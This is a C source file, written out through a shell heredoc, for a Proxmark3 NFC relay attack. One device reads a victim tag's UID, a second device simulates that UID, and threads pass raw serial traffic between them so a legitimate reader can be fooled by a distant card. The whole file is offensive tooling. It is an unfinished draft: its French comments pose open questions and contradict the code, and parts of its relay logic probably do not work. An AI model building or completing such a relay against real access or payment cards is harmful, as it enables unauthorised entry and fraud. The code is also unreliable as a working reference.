cat << 'EOF' > relay.c
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <process.h>

#define PROXY_PORT "COM9"
#define MOLE_PORT  "COM10"
#define PM3_PATH   "client\\proxmark3.exe"

// --- FONCTIONS DE LANCEMENT ---

// Utilise l'exécutable officiel pour récupérer l'UID
void get_uid_from_mole(char* out_uid) {
    char cmd[256];
    sprintf(cmd, "%s -p %s -c \"hf 14a info\" ", PM3_PATH, MOLE_PORT);
    
    printf("[*] Scan du tag sur le MOLE via %s...\n", MOLE_PORT);
    FILE* fp = _popen(cmd, "r");
    if (!fp) return;

    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        char* p = strstr(line, "UID :");
        if (!p) p = strstr(line, "UID:");
        if (p) {
            char* start = strstr(p, ":") + 1;
            int j = 0;
            for(int i=0; start[i] != '\0' && j < 31; i++) {
                if (isxdigit(start[i])) out_uid[j++] = start[i];
            }
            out_uid[j] = '\0';
        }
    }
    _pclose(fp);
}

// Initialise le Proxy pour simuler le tag avec l'UID trouvé
void start_proxy_sim(const char* uid) {
    char cmd[256];
    // On lance le proxy en mode "sim" mais on ne ferme pas la session 
    // ou on utilise une commande qui laisse le port ouvert au relai.
    sprintf(cmd, "%s -p %s -c \"hf 14a sim -t 7 -u %s\" ", PM3_PATH, PROXY_PORT, uid);
    printf("[*] Lancement simulation sur PROXY (%s)...\n", PROXY_PORT);
    
    // On lance sans attendre (asynchrone) pour que le port reste actif
    system(cmd); 
    printf("[*] Simulation active. Le Proxy attend le lecteur...\n");
    //le sim bloque toute interaction tant qu'il est actif, il faut le lancer avant d'ouvrir les ports COM en C pour le relai --< comment ?
   
}

// --- LOGIQUE DE RELAI (THREADS) ---

typedef struct {
    HANDLE src;
    HANDLE dst;
    char name[20];
} RelayParams;

void relay_thread(void* p) {
    RelayParams* rp = (RelayParams*)p;
    char buf[512];
    DWORD bytesRead, bytesWritten;

    printf("[+] Thread %s actif\n", rp->name);
    while(1) {
        if (ReadFile(rp->src, buf, sizeof(buf), &bytesRead, NULL) && bytesRead > 0) {
            // Ici, on pourrait parser les trames NFC si besoin
            WriteFile(rp->dst, buf, bytesRead, &bytesWritten, NULL);
        }
    }
}

int main() {
    char uid[33] = {0};

    printf("=== SYSTEME DE RELAI PM3 ===\n");

    /*
    Etapes : 
    hf mfu reader sur le mole pour se comporter en reader
    Il faut enregistrer toute la communication pendant que le lecteur lit le tag (sniff ou trace)
    Analyser la trace pour extraire l'UID et les éventuelles données d'auth
    Comment enregistrer alors qu'on est en mode reader ? Pour moi, le sniff est bloquant (on peut rien faire d'autre en meme temps) et le trace list ne montre que les commandes envoyées, pas les réponses du tag. Il faudrait une commande qui affiche les échanges bruts (raw) pendant le sniff, ou un mode de trace plus détaillé.
    */

    // 1. Récupération de l'UID réel sur le Mole
    get_uid_from_mole(uid);
    if (strlen(uid) == 0) {
        printf("[!] Impossible de lire le tag. Verifiez le Mole.\n");
        return 1;
    }
    if (strlen(uid) > 14) {
        uid[14] = '\0';
    }
    printf("[+] UID du tag detecte : %s\n", uid);

    // 2. Initialisation du Proxy
    // Note : Cette étape peut être complexe car une fois 'sim' lancé, 
    // le port COM peut être occupé par le client PM3.
    // Il vaut mieux lancer la sim, puis fermer le client, et reprendre le port en C.
    start_proxy_sim(uid);
    printf("On ne lance pas le sim - simulation en TR");

    // 3. Ouverture des ports pour le relai de données brutes
    HANDLE hProxy = CreateFile("\\\\.\\" PROXY_PORT, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE hMole = CreateFile("\\\\.\\" MOLE_PORT, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hProxy == INVALID_HANDLE_VALUE || hMole == INVALID_HANDLE_VALUE) {
        printf("[!] Erreur ports COM (Erreur %ld)\n", GetLastError());
        return 1;
    }

    // 4. Lancement du relai bidirectionnel
    RelayParams p1 = { hProxy, hMole, "LECTEUR -> TAG" };
    RelayParams p2 = { hMole, hProxy, "TAG -> LECTEUR" };

    _beginthread(relay_thread, 0, &p1);
    _beginthread(relay_thread, 0, &p2);

    printf("[*] Relai en cours. Approchez le lecteur du Proxy...\n");
    while(1) Sleep(1000);

    return 0;
}
EOF